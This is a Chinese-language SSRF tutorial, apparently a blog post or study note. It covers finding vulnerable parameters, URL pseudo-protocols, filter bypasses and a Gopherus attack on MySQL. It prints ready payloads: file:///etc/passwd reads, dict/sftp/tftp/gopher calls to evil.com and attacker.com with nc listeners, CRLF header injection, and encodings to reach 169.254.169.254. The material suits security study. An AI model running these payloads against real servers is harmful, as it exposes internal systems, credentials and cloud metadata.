# SSRF是什么

SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。

一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

# SSRF漏洞原理

SSRF 形成的原因大都是由于**服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。**

原理图片:

https://img-blog.csdnimg.cn/b53de209637a4a88853e1762d639b5d3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Zu254K55pWy5Luj56CB,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center

比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器

# SSRF漏洞挖掘

1、分享：通过URL地址分享网页内容

2、[转码](https://so.csdn.net/so/search?q=转码&spm=1001.2101.3001.7020)服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。

3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。

4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。

`http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de`

例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。

5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。

6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。

(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。


7、从URL关键字中寻找
利用google 语法加上这些关键字去寻找SSRF漏洞

> share
> wap
> url
> link
> src
> source
> target
> u
> display
> sourceURl
> imageURL
> domain

简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞



# 产生SSRF漏洞的函数

**1、file_get_contents:**



**2、sockopen():**



**3、curl_exec():**



# SSRF中url的伪协议

**当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议**

file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
sftp:// SSH文件传输协议或安全文件传输协议
ldap:// 轻量级目录访问协议
tftp:// 简单文件传输协议
gopher:// 分布式文档传递服务，可使用gopherus生成payload
1、file

这种URL Schema可以尝试从文件系统中获取文件：

`http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini`

如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：

2、dict

这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：

`http://example.com/ssrf.php?dict://evil.com:1337/`
`evil.com:$ nc -lvp 1337`
`Connection from [192.168.0.12] port 1337[tcp/*]`
`accepted (family 2, sport 31126)CLIENT libcurl 7.40.0`

3、sftp

在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。

`http://example.com/ssrf.php?url=sftp://evil.com:1337/
evil.com:$ nc -lvp 1337`
`Connection from [192.168.0.12] port 1337[tcp/*]`
`accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2`

4、ldap://或ldaps:// 或ldapi://

LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。

`http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit
`

5、tftp://

TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。

`http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET`
`evil.com:# nc -lvup 1337`
`Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3`

6、gopher://

Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。

`http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-<?php header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');?>`
`evil.com:# nc -lvp 1337
Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest`

# SSRF漏洞利用（危害）
1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;

2.攻击运行在内网或本地的应用程序（比如溢出）;

3.对内网web应用进行指纹识别，通过访问默认文件实现;

4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;

5.利用file协议读取本地文件等。.

6.各个协议调用探针：http,file,dict,ftp,gopher等

http:192.168.64.144/phpmyadmin/
file:///D:/www.txt
dict://192.168.64.144:3306/info
ftp://192.168.64.144:21

# SSRF绕过方式
部分存在漏洞，或者可能产生SSRF的功能中做了白名单或者黑名单的处理，来达到阻止对内网服务和资源的攻击和访问。因此想要达到SSRF的攻击，需要对请求的参数地址做相关的绕过处理，常见的绕过方式如下：

一、常见的绕过方式

1、限制为`http://www.xxx.com` 域名时（利用@）

可以尝试采用http基本身份认证的方式绕过
如：`http://www.aaa.com@www.bbb.com@www.ccc.com`，在对@解析域名中，不同的处理函数存在处理差异
在PHP的parse_url中会识别`www.ccc.com`，而libcurl则识别为`www.bbb.com`。

2.采用短网址绕过

比如百度短地址`https://dwz.cn/`

3.采用进制转换

127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.

4.利用特殊域名

原理是DNS解析。xip.io可以指向任意域名，即
127.0.0.1.xip.io，可解析为127.0.0.1
(xip.io 现在好像用不了了，可以找找其他的)

5.利用[::]

可以利用[::]来绕过localhost
http://169.254.169.254>>http://[::169.254.169.254]

6.利用句号

127。0。0。1 >>> 127.0.0.1

7、CRLF 编码绕过

%0d->0x0d->\r回车
%0a->0x0a->\n换行
进行HTTP头部注入

example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a 
1
8.利用封闭的字母数字

利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> example.com
http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿

二、常见限制

1.限制为http://www.xxx.com 域名

采用http基本身份认证的方式绕过，即@
http://www.xxx.com@www.xxc.com

2.限制请求IP不为内网地址

当不允许ip为内网地址时：
（1）采取短网址绕过
（2）采取特殊域名
（3）采取进制转换

3.限制请求只为http协议

（1）采取302跳转
（2）采取短地址



# gopher为协议

![image-20240426173303910](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240426173303910.png)



![image-20240426175619257](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240426175619257.png)



# gopher攻击mysql

使用工具**Gopherus**

python gopherus.py --exploit mysql

![image-20240503143102257](https://cdn.jsdelivr.net/gh/chenppxx/picture1/image-20240503143102257.png)

将输出内容复制下来后,

burp传过去就行，但是注意要先url编码一下

参考连接:

[CTFSHOW-日刷-红包题第九弹-SSRF-Gopher攻击mysql - Aninock - 博客园 (cnblogs.com)](https://www.cnblogs.com/aninock/p/15663953.html)